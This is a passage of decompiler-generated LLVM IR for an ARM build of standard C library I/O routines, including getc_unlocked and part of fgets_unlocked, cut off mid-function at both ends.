  %v0_20454 = phi i32 [ %v0_20448, %dec_label_pc_20448 ], [ %v2_2042898, %dec_label_pc_2041c ], [ %v2_20428, %dec_label_pc_20434.dec_label_pc_20428_crit_edge ]
  %v1_2044c = phi i32 [ %v0_20448, %dec_label_pc_20448 ], [ %v3_2041c, %dec_label_pc_2041c ], [ %v1_2042c.pre, %dec_label_pc_20434.dec_label_pc_20428_crit_edge ]
  %v3_2044c = icmp uge i32 %v0_20454, %v1_2044c
  store i1 %v3_2044c, i1* %cpsr_c.global-to-local, align 1
  %v9_2044c = icmp eq i32 %v0_20454, %v1_2044c
  br i1 %v9_2044c, label %dec_label_pc_20454, label %dec_label_pc_2044c.dec_label_pc_2041c_crit_edge

dec_label_pc_2044c.dec_label_pc_2041c_crit_edge:  ; preds = %dec_label_pc_2044c
  %v0_2041c.pre = load i32, i32* @r5, align 4
  %v0_20424.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2041c

dec_label_pc_20454:                               ; preds = %dec_label_pc_2044c
  %v2_20454 = icmp ne i32 %v1_2044c, 0
  store i1 %v2_20454, i1* %cpsr_c.global-to-local, align 1
  %v7_20458 = icmp slt i32 %v1_2044c, 2
  br i1 %v7_20458, label %dec_label_pc_20474, label %dec_label_pc_2045c

dec_label_pc_2045c:                               ; preds = %dec_label_pc_20454
  %v0_2045c = load i32, i32* @r5, align 4
  %v1_2045c = add i32 %v0_2045c, 56
  store i32 %v1_2045c, i32* %r0.global-to-local, align 4
  %v0_20460 = load i32, i32* %r1.global-to-local, align 4
  %v1_20460 = add i32 %v0_20460, 129
  store i32 %v1_20460, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_20474

dec_label_pc_20474:                               ; preds = %dec_label_pc_20400, %dec_label_pc_2045c, %dec_label_pc_20454, %bb71, %dec_label_pc_2033c
  %v0_20474 = load i32, i32* @r5, align 4
  %v1_20474 = add i32 %v0_20474, 32
  %v2_20474 = inttoptr i32 %v1_20474 to i32*
  %v3_20474 = load i32, i32* %v2_20474, align 4
  store i32 %v3_20474, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_20478 = icmp eq i32 %v3_20474, 0
  br i1 %v2_20478, label %dec_label_pc_20480, label %dec_label_pc_2033c

dec_label_pc_20480:                               ; preds = %dec_label_pc_20474, %dec_label_pc_2032c
  %v0_20480 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_20480, i32* %r0.global-to-local, align 4
  %v0_204bc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_20488:                               ; preds = %dec_label_pc_20164
  %v3_20488 = load i16, i16* %arg1, align 2
  %v4_20488 = zext i16 %v3_20488 to i32
  %v1_2048c = and i32 %v4_20488, 64
  store i32 %v1_2048c, i32* %r3.global-to-local, align 4
  %v2_2048c = icmp eq i32 %v1_2048c, 0
  br i1 %v2_2048c, label %bb72, label %dec_label_pc_20498

bb72:                                             ; preds = %dec_label_pc_20488
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_20498:                               ; preds = %dec_label_pc_20488
  %v2_20498 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_20498, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2049c = icmp eq i32 %v2_20498, 0
  br i1 %v2_2049c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_20498
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_20498
  %v1_204a0 = load i32, i32* @r4, align 4
  %v2_204a0 = inttoptr i32 %v1_204a0 to i16*
  %v3_204a0 = load i16, i16* %v2_204a0, align 2
  %v4_204a0 = zext i16 %v3_204a0 to i32
  store i32 %v4_204a0, i32* %r3.global-to-local, align 4
  %v2_204a4 = add i32 %v1_204a0, 8
  %v3_204a4 = inttoptr i32 %v2_204a4 to i32*
  %v4_204a4 = load i32, i32* %v3_204a4, align 4
  store i32 %v4_204a4, i32* %r2.global-to-local, align 4
  %v2_204a8 = and i32 %v4_204a0, 65471
  store i32 %v2_204a8, i32* %r3.global-to-local, align 4
  %v2_204ac = trunc i32 %v2_204a8 to i16
  store i16 %v2_204ac, i16* %v2_204a0, align 2
  %v1_204b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_204b0 = load i32, i32* @r4, align 4
  %v3_204b0 = add i32 %v2_204b0, 28
  %v4_204b0 = inttoptr i32 %v3_204b0 to i32*
  store i32 %v1_204b0, i32* %v4_204b0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_20480, %.thread14
  %v0_204bc = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_204bc.pre, %dec_label_pc_20480 ], [ 0, %.thread14 ]
  store i32 %v0_204bc, i32* %r0.global-to-local, align 4
  store i32 %v6_20138, i32* %r5.global-to-local, align 4
  ret i32 %v0_204bc

; uselistorder directives
  uselistorder i32 %v0_204bc, { 1, 0 }
  uselistorder i32 %v3_20474, { 1, 2, 0 }
  uselistorder i32 %v0_20448, { 1, 0, 2 }
  uselistorder i32 %v1_2042c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_203cc, { 1, 0, 2 }
  uselistorder i32 %v0_20394, { 1, 0, 2 }
  uselistorder i32 %v1_20378.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_2035c, { 1, 0 }
  uselistorder i32 %v0_20300, { 1, 0, 2 }
  uselistorder i32 %v1_202e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_202d4, { 1, 0 }
  uselistorder i32 %v0_20298, { 1, 0, 2 }
  uselistorder i32 %v1_2027c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_20264, { 1, 0 }
  uselistorder i32 %v0_2022c, { 1, 0, 2 }
  uselistorder i32 %v1_20210.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_20200, { 1, 0 }
  uselistorder i32 %v0_201bc, { 1, 0, 2 }
  uselistorder i32 %v1_201a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_20178, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 3, 5, 4, 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 9, 1, 0, 2, 4, 3, 5, 7, 6, 8 }
  uselistorder i32* %r3.global-to-local, { 53, 54, 55, 0, 1, 3, 2, 48, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 47, 16, 17, 18, 19, 20, 21, 23, 22, 49, 24, 25, 26, 27, 29, 28, 50, 30, 31, 32, 33, 35, 34, 51, 36, 37, 38, 39, 41, 40, 52, 42, 43, 46, 44, 45 }
  uselistorder i32* %r2.global-to-local, { 19, 20, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 22, 23, 3, 1, 2, 20, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 40, 11, 1, 2, 3, 30, 31, 4, 5, 6, 7, 8, 28, 29, 9, 10, 0, 12, 13, 14, 32, 33, 15, 16, 17, 34, 35, 18, 19, 20, 21, 36, 37, 22, 23, 24, 38, 39, 25, 26, 27 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 92, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13, 14 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 38, 39, 35, 36 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 33, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_20474, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_2044c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20434, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_203b4, { 1, 0 }
  uselistorder label %dec_label_pc_203a8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_20398, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20380, { 1, 0 }
  uselistorder label %dec_label_pc_2033c, { 1, 0 }
  uselistorder label %dec_label_pc_2032cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_20304, { 2, 1, 0 }
  uselistorder label %dec_label_pc_202ec, { 1, 0 }
  uselistorder label %dec_label_pc_202ac, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_2029c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20284, { 1, 0 }
  uselistorder label %dec_label_pc_20258, { 1, 2, 0 }
  uselistorder label %dec_label_pc_20230, { 2, 1, 0 }
  uselistorder label %dec_label_pc_20218, { 1, 0 }
  uselistorder label %dec_label_pc_201d0, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_201c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_201a8, { 1, 0 }
  uselistorder label %dec_label_pc_20174, { 1, 0 }
}

define i32 @function_204d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_204d0:
  %v0_204d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_204d0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_204d0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_204d0, %bb
  %v10_204e0 = phi i32 [ %arg1, %dec_label_pc_204d0 ], [ 0, %bb ]
  ret i32 %v10_204e0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_204e4 = load i32, i32* @r4, align 4
  store i32 %v3_204e4, i32* %stack_var_-12, align 4
  %v6_204e4 = load i32, i32* @r5, align 4
  %v9_204e4 = load i32, i32* @lr, align 4
  %v0_204e8 = load i32, i32* @r0, align 4
  %v1_204e8 = add i32 %v0_204e8, 16
  %v2_204e8 = inttoptr i32 %v1_204e8 to i32*
  %v3_204e8 = load i32, i32* %v2_204e8, align 4
  store i32 %v3_204e8, i32* %r2.global-to-local, align 4
  %v1_204ec = add i32 %v0_204e8, 24
  %v2_204ec = inttoptr i32 %v1_204ec to i32*
  %v3_204ec = load i32, i32* %v2_204ec, align 4
  %v3_204f0 = icmp ult i32 %v3_204e8, %v3_204ec
  store i32 %v0_204e8, i32* @r4, align 4
  br i1 %v3_204f0, label %bb, label %dec_label_pc_20510

bb:                                               ; preds = %entry
  %v2_204fc = inttoptr i32 %v3_204e8 to i8*
  %v3_204fc = load i8, i8* %v2_204fc, align 1
  %v4_204fc = zext i8 %v3_204fc to i32
  store i32 %v4_204fc, i32* %r0.global-to-local, align 4
  %v6_204fc = add i32 %v3_204e8, 1
  store i32 %v6_204fc, i32* %r2.global-to-local, align 4
  store i32 %v6_204fc, i32* %v2_204e8, align 4
  br label %dec_label_pc_205fc

dec_label_pc_20510:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r5, align 4
  %v1_20510 = inttoptr i32 %v0_204e8 to i16*
  %v2_20510 = load i16, i16* %v1_20510, align 2
  %v3_20510 = zext i16 %v2_20510 to i32
  %v1_20514 = and i32 %v3_20510, 131
  %tmp25 = icmp ugt i32 %v1_20514, 128
  br i1 %tmp25, label %dec_label_pc_20530, label %dec_label_pc_20520

dec_label_pc_20520:                               ; preds = %dec_label_pc_20510
  store i32 128, i32* @r1, align 4
  %v0_20524 = call i32 @__stdio_trans2r_o()
  store i32 %v0_20524, i32* %r0.global-to-local, align 4
  %v2_20528 = icmp eq i32 %v0_20524, 0
  br i1 %v2_20528, label %dec_label_pc_20520.dec_label_pc_20530_crit_edge, label %dec_label_pc_205f8

dec_label_pc_20520.dec_label_pc_20530_crit_edge:  ; preds = %dec_label_pc_20520
  %v0_20530.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_20530

dec_label_pc_20530:                               ; preds = %dec_label_pc_20520.dec_label_pc_20530_crit_edge, %dec_label_pc_20510
  %v2_20570 = phi i32 [ %v0_20530.pre, %dec_label_pc_20520.dec_label_pc_20530_crit_edge ], [ %v0_204e8, %dec_label_pc_20510 ]
  %v1_20530 = inttoptr i32 %v2_20570 to i16*
  %v2_20530 = load i16, i16* %v1_20530, align 2
  %v3_20530 = zext i16 %v2_20530 to i32
  store i32 %v3_20530, i32* %r2.global-to-local, align 4
  %v1_20534 = and i32 %v3_20530, 2
  %v2_20534 = icmp eq i32 %v1_20534, 0
  br i1 %v2_20534, label %dec_label_pc_20560, label %dec_label_pc_2053c

dec_label_pc_2053c:                               ; preds = %dec_label_pc_20530
  %tmp26 = urem i16 %v2_20530, 2
  %v1_2053c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_2053c
  %v4_20540 = and i32 %tmp22, 4
  %v5_20540 = add i32 %v4_20540, %v2_20570
  %v1_20544 = add i32 %v5_20540, 36
  %v2_20544 = inttoptr i32 %v1_20544 to i8*
  %v3_20544 = load i8, i8* %v2_20544, align 1
  %v4_20544 = zext i8 %v3_20544 to i32
  %v1_20548 = add nsw i32 %v3_20530, -1
  store i32 %v1_20548, i32* %r2.global-to-local, align 4
  store i32 %v4_20544, i32* %r0.global-to-local, align 4
  %v2_20554 = add i32 %v2_20570, 40
  %v3_20554 = inttoptr i32 %v2_20554 to i32*
  store i32 0, i32* %v3_20554, align 4
  %v0_20558 = load i32, i32* %r2.global-to-local, align 4
  %v1_20558 = trunc i32 %v0_20558 to i16
  %v2_20558 = load i32, i32* @r4, align 4
  %v3_20558 = inttoptr i32 %v2_20558 to i16*
  store i16 %v1_20558, i16* %v3_20558, align 2
  br label %dec_label_pc_205fc

dec_label_pc_20560:                               ; preds = %dec_label_pc_20530
  %v1_20560 = add i32 %v2_20570, 16
  %v1_20564 = inttoptr i32 %v1_20560 to i32*
  %v2_20564 = load i32, i32* %v1_20564, align 4
  store i32 %v2_20564, i32* @r1, align 4
  %v3_20564 = add i32 %v2_20570, 20
  %v4_20564 = inttoptr i32 %v3_20564 to i32*
  %v5_20564 = load i32, i32* %v4_20564, align 4
  %v9_20568 = icmp eq i32 %v5_20564, %v2_20564
  br i1 %v9_20568, label %dec_label_pc_20578, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_20560
  %v2_2056c = inttoptr i32 %v2_20564 to i8*
  %v3_2056c = load i8, i8* %v2_2056c, align 1
  %v4_2056c = zext i8 %v3_2056c to i32
  store i32 %v4_2056c, i32* %r0.global-to-local, align 4
  %v6_2056c = add i32 %v2_20564, 1
  store i32 %v6_2056c, i32* @r1, align 4
  store i32 %v6_2056c, i32* %v1_20564, align 4
  br label %dec_label_pc_205fc

dec_label_pc_20578:                               ; preds = %dec_label_pc_20560
  %v1_20578 = add i32 %v2_20570, 4
  %v2_20578 = inttoptr i32 %v1_20578 to i32*
  %v3_20578 = load i32, i32* %v2_20578, align 4
  %v7_2057c = icmp eq i32 %v3_20578, -2
  br i1 %v7_2057c, label %.thread7, label %dec_label_pc_20590

.thread7:                                         ; preds = %dec_label_pc_20578
  %v2_20580 = or i16 %v2_20530, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_20580, i16* %v1_20530, align 2
  br label %dec_label_pc_205fc

dec_label_pc_20590:                               ; preds = %dec_label_pc_20578
  %v1_20590 = and i32 %v3_20530, 768
  %v2_20590 = icmp eq i32 %v1_20590, 0
  br i1 %v2_20590, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_20590
  %v1_20598 = load i32, i32* @r5, align 4
  %v3_20598 = add i32 %v1_20598, 76
  %v4_20598 = inttoptr i32 %v3_20598 to i32*
  %v5_20598 = load i32, i32* %v4_20598, align 4
  store i32 %v5_20598, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_20590, %bb23
  store i32 132512, i32* @lr, align 4
  %v1_2059c = xor i1 %v2_20590, true
  call void @__pseudo_cond_branch(i1 %v1_2059c, i32 ptrtoint (i32* @global_var_20138.671 to i32))
  %v0_205a0 = load i32, i32* @r4, align 4
  %v1_205a0 = add i32 %v0_205a0, 8
  store i32 %v1_205a0, i32* %r2.global-to-local, align 4
  %v1_205a4 = inttoptr i32 %v1_205a0 to i32*
  %v2_205a4 = load i32, i32* %v1_205a4, align 4
  store i32 %v2_205a4, i32* %r2.global-to-local, align 4
  %v3_205a4 = add i32 %v0_205a0, 12
  %v4_205a4 = inttoptr i32 %v3_205a4 to i32*
  %v5_205a4 = load i32, i32* %v4_205a4, align 4
  %v9_205a8 = icmp eq i32 %v5_205a4, %v2_205a4
  br i1 %v9_205a8, label %dec_label_pc_205dc, label %dec_label_pc_205b0

dec_label_pc_205b0:                               ; preds = %.thread9
  %v2_205b0 = add i32 %v0_205a0, 24
  %v3_205b0 = inttoptr i32 %v2_205b0 to i32*
  store i32 %v2_205a4, i32* %v3_205b0, align 4
  %v0_205b4 = load i32, i32* @r4, align 4
  store i32 %v0_205b4, i32* %r0.global-to-local, align 4
  %v2_205b8 = call i32 @__stdio_rfill(i32 %v0_205b4)
  store i32 %v2_205b8, i32* %r0.global-to-local, align 4
  %v2_205bc = icmp eq i32 %v2_205b8, 0
  br i1 %v2_205bc, label %dec_label_pc_205f8, label %dec_label_pc_205c4

dec_label_pc_205c4:                               ; preds = %dec_label_pc_205b0
  %v0_205c4 = load i32, i32* @r4, align 4
  %v1_205c4 = add i32 %v0_205c4, 20
  %v2_205c4 = inttoptr i32 %v1_205c4 to i32*
  %v3_205c4 = load i32, i32* %v2_205c4, align 4
  %v2_205c8 = add i32 %v0_205c4, 24
  %v3_205c8 = inttoptr i32 %v2_205c8 to i32*
  store i32 %v3_205c4, i32* %v3_205c8, align 4
  %v0_205cc = load i32, i32* @r4, align 4
  %v1_205cc = add i32 %v0_205cc, 16
  %v2_205cc = inttoptr i32 %v1_205cc to i32*
  %v3_205cc = load i32, i32* %v2_205cc, align 4
  %v1_205d0 = inttoptr i32 %v3_205cc to i8*
  %v2_205d0 = load i8, i8* %v1_205d0, align 1
  %v3_205d0 = zext i8 %v2_205d0 to i32
  store i32 %v3_205d0, i32* %r0.global-to-local, align 4
  %v5_205d0 = add i32 %v3_205cc, 1
  store i32 %v5_205d0, i32* %v2_205cc, align 4
  br label %dec_label_pc_205fc

dec_label_pc_205dc:                               ; preds = %.thread9
  %v1_205dc = inttoptr i32 %v0_205a0 to i16*
  store i32 %v0_205a0, i32* %r0.global-to-local, align 4
  %v2_205e0 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_205e0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_205e8 = call i32 @__stdio_READ(i16* %v1_205dc, i32 %v2_205e0, i32 1)
  store i32 %v5_205e8, i32* %r0.global-to-local, align 4
  %v2_205ec = icmp eq i32 %v5_205e8, 0
  br i1 %v2_205ec, label %dec_label_pc_205f8, label %bb24

bb24:                                             ; preds = %dec_label_pc_205dc
  %v4_205f0 = load i8, i8* %stack_var_-17, align 1
  %v5_205f0 = sext i8 %v4_205f0 to i32
  store i32 %v5_205f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_205fc

dec_label_pc_205f8:                               ; preds = %dec_label_pc_205dc, %dec_label_pc_20520, %dec_label_pc_205b0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_205fc

dec_label_pc_205fc:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_2053c, %dec_label_pc_205c4, %dec_label_pc_205f8
  %v2_20600 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_20600, i32* @r4, align 4
  store i32 %v6_204e4, i32* @r5, align 4
  store i32 %v9_204e4, i32* @lr, align 4
  %v1_20604 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_20604

; uselistorder directives
  uselistorder i32 %v2_20564, { 1, 0, 2, 3 }
  uselistorder i32 %v2_20570, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_204e8, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 9, 6, 7, 11, 8, 10, 13, 12, 0, 1, 2, 3, 5, 4 }
  uselistorder i32 768, { 1, 0 }
  uselistorder label %dec_label_pc_205fc, { 6, 2, 5, 1, 3, 4, 0 }
  uselistorder label %dec_label_pc_205f8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_20610 = load i32, i32* @r6, align 4
  %v12_20610 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_20614 = icmp eq i32 %arg2, 0
  store i1 %v2_20614, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_2069c, label %dec_label_pc_20684.preheader

dec_label_pc_20684.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_206842 = add i32 %arg2, -1
  store i32 %v1_206842, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_206848 = icmp eq i32 %arg2, 1
  store i1 %v7_206848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_206848, label %dec_label_pc_2068c, label %dec_label_pc_20630

dec_label_pc_20630:                               ; preds = %dec_label_pc_20684.preheader, %dec_label_pc_20684.backedge.dec_label_pc_20630_crit_edge
  %v0_20654 = phi i32 [ %v0_20630.pre, %dec_label_pc_20684.backedge.dec_label_pc_20630_crit_edge ], [ %arg3, %dec_label_pc_20684.preheader ]
  %v1_20630 = add i32 %v0_20654, 16
  %v2_20630 = inttoptr i32 %v1_20630 to i32*
  %v3_20630 = load i32, i32* %v2_20630, align 4
  store i32 %v3_20630, i32* %r2.global-to-local, align 4
  %v1_20634 = add i32 %v0_20654, 24
  %v2_20634 = inttoptr i32 %v1_20634 to i32*
  %v3_20634 = load i32, i32* %v2_20634, align 4
  store i32 %v3_20634, i32* %r3.global-to-local, align 4
  %v3_20638 = icmp uge i32 %v3_20630, %v3_20634
  store i1 %v3_20638, i1* %cpsr_c.global-to-local, align 1
  %v9_20638 = icmp eq i32 %v3_20630, %v3_20634
  store i1 %v9_20638, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_20638, label %dec_label_pc_20654, label %dec_label_pc_20640

dec_label_pc_20640:                               ; preds = %dec_label_pc_20630
  %v1_20640 = inttoptr i32 %v3_20630 to i8*
  %v2_20640 = load i8, i8* %v1_20640, align 1
  %v3_20640 = zext i8 %v2_20640 to i32
  store i32 %v3_20640, i32* %r3.global-to-local, align 4
  %v5_20640 = add i32 %v3_20630, 1
  store i32 %v5_20640, i32* %r2.global-to-local, align 4
  %v2_20644 = load i32, i32* @r5, align 4
  %v3_20644 = inttoptr i32 %v2_20644 to i8*
  store i8 %v2_20640, i8* %v3_20644, align 1
  %v4_20644 = load i32, i32* @r5, align 4
  %v5_20644 = add i32 %v4_20644, 1
  store i32 %v5_20644, i32* @r5, align 4
  %v0_20648 = load i32, i32* %r3.global-to-local, align 4
  %v2_20648 = icmp ugt i32 %v0_20648, 9
  store i1 %v2_20648, i1* %cpsr_c.global-to-local, align 1
  %v7_20648 = icmp eq i32 %v0_20648, 10
  store i1 %v7_20648, i1* %cpsr_z.global-to-local, align 1
  %v0_2064c = load i32, i32* %r2.global-to-local, align 4
  %v1_2064c = load i32, i32* @r4, align 4
  %v2_2064c = add i32 %v1_2064c, 16
  %v3_2064c = inttoptr i32 %v2_2064c to i32*
  store i32 %v0_2064c, i32* %v3_2064c, align 4
  br i1 %v7_20648, label %dec_label_pc_2068c, label %dec_label_pc_20684.backedge

dec_label_pc_20654:                               ; preds = %dec_label_pc_20630
  %v1_20654 = inttoptr i32 %v0_20654 to i16*
  %v3_20658 = call i32 @getc_unlocked(i16* %v1_20654)
  %v3_2065c = icmp eq i32 %v3_20658, -1
  store i1 %v3_2065c, i1* %cpsr_c.global-to-local, align 1
  %v8_2065c = icmp eq i32 %v3_20658, -1
  store i1 %v8_2065c, i1* %cpsr_z.global-to-local, align 1
  %v1_20660 = urem i32 %v3_20658, 256
  store i32 %v1_20660, i32* %r3.global-to-local, align 4
  br i1 %v3_2065c, label %dec_label_pc_20668, label %dec_label_pc_20680

dec_label_pc_20668:                               ; preds = %dec_label_pc_20654
  %v0_20668 = load i32, i32* @r4, align 4
  %v1_20668 = inttoptr i32 %v0_20668 to i16*
  %v2_20668 = load i16, i16* %v1_20668, align 2
  %v3_20668 = zext i16 %v2_20668 to i32
  store i32 %v3_20668, i32* %r3.global-to-local, align 4
  %v1_2066c = and i32 %v3_20668, 8
  %v2_2066c = icmp eq i32 %v1_2066c, 0
  store i1 %v2_2066c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2066c, label %dec_label_pc_2068c, label %dec_label_pc_2069c

dec_label_pc_20680:                               ; preds = %dec_label_pc_20654
  %v1_20678 = trunc i32 %v3_20658 to i8
  %v2_20678 = load i32, i32* @r5, align 4
  %v3_20678 = inttoptr i32 %v2_20678 to i8*
  store i8 %v1_20678, i8* %v3_20678, align 1
  %v4_20678 = load i32, i32* @r5, align 4
  %v5_20678 = add i32 %v4_20678, 1
  store i32 %v5_20678, i32* @r5, align 4
  %v0_2067c = load i32, i32* %r3.global-to-local, align 4
  %v2_2067c = icmp ugt i32 %v0_2067c, 9
  store i1 %v2_2067c, i1* %cpsr_c.global-to-local, align 1
  %v7_2067c = icmp eq i32 %v0_2067c, 10
  store i1 %v7_2067c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2067c, label %dec_label_pc_2068c, label %dec_label_pc_20684.backedge

dec_label_pc_20684.backedge:                      ; preds = %dec_label_pc_20680, %dec_label_pc_20640
  %v0_20684 = load i32, i32* @r6, align 4
  %v1_20684 = add i32 %v0_20684, -1
  store i32 %v1_20684, i32* @r6, align 4
  %v2_20684 = icmp ne i32 %v0_20684, 0
  store i1 %v2_20684, i1* %cpsr_c.global-to-local, align 1
  %v7_20684 = icmp eq i32 %v0_20684, 1
  store i1 %v7_20684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_20684, label %dec_label_pc_2068c, label %dec_label_pc_20684.backedge.dec_label_pc_20630_crit_edge

dec_label_pc_20684.backedge.dec_label_pc_20630_crit_edge: ; preds = %dec_label_pc_20684.backedge
  %v0_20630.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_20630

dec_label_pc_2068c:                               ; preds = %dec_label_pc_20680, %dec_label_pc_20684.backedge, %dec_label_pc_20640, %dec_label_pc_20684.preheader, %dec_label_pc_20668
  %v0_2068c = load i32, i32* @r5, align 4
  %v1_2068c = load i32, i32* @r7, align 4
  %v3_2068c = icmp uge i32 %v0_2068c, %v1_2068c
  store i1 %v3_2068c, i1* %cpsr_c.global-to-local, align 1
  %v9_2068c = icmp eq i32 %v0_2068c, %v1_2068c
  store i1 %v9_2068c, i1* %cpsr_z.global-to-local, align 1
  %v2_20690 = xor i1 %v9_2068c, true
  %v3_20690 = and i1 %v3_2068c, %v2_20690
  br i1 %v3_20690, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_2068c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_20694 = inttoptr i32 %v0_2068c to i8*
  store i8 0, i8* %v7_20694, align 1
  %v0_20698.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_20698.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_2068c, %bb
  %v1_20698 = phi i1 [ %v1_20698.pre, %bb ], [ %v9_2068c, %dec_label_pc_2068c ]
  %v0_20698 = phi i1 [ %v0_20698.pre, %bb ], [ %v3_2068c, %dec_label_pc_2068c ]
  %v2_20698 = xor i1 %v1_20698, true
  %v3_20698 = and i1 %v0_20698, %v2_20698
